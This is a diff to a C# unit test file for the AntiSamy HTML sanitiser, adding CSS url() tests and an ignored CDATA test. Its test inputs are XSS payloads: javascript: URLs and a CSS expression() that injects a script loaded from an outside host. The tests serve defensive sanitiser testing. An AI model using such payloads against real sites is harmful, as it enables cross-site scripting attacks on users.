@@ -115,7 +115,9 @@ namespace AntiSamyTests
             antisamy.Scan("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->", policy).GetCleanHtml().Should().NotContain("javascript");
             antisamy.Scan("<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">", policy).GetCleanHtml()
                 .Should().NotContain("document");
-            antisamy.Scan("<dIv sTyLe='background-image: url(sheep.png), url(betweengrassandsky.png), linear-gradient(#e66465, #9198e5);'></dIv>", policy).GetCleanHtml();
+            antisamy.Scan("<dIv/sTyLe='background-image: url(sheep.png), url(\"javascript:alert('XSS')\");'></dIv>", policy).GetCleanHtml().Should().Contain("style=''");
+            antisamy.Scan("<dIv/sTyLe='background-image: url(sheep.png), url(\"https://safe.com/kitten.jpg\");'></dIv>", policy).GetCleanHtml()
+                .Should().ContainAll("sheep.png", "kitten.jpg");
         }
 
         [Test(Description = "Test CSS protections.")]
@@ -160,6 +162,14 @@ namespace AntiSamyTests
         public void TestPreserveFontFamily()
         {
             antisamy.Scan("<div style=\"font-family: Geneva, Arial, courier new, sans-serif\">Test</div>", policy).GetCleanHtml().Should().Contain("font-family");
+        }
+       
+        [Test(Description = "Tests issue #29 from owaspantisamy Google Code Archive>: 'missing quotes around properties with spaces'")]
+        [Ignore("CDATA is not well-handled by HtmlAgilityPack. Use this test when a solution comes up.")]
+        public void TesCsstPropertiesWithSpaces()
+        {
+            const string html = "<style type=\"text/css\"><![CDATA[P {\n	font-family: \"Arial Unicode MS\";\n}\n]]></style>";
+            antisamy.Scan(html, policy).GetCleanHtml().Should().Be(html);
         }
     }
 }
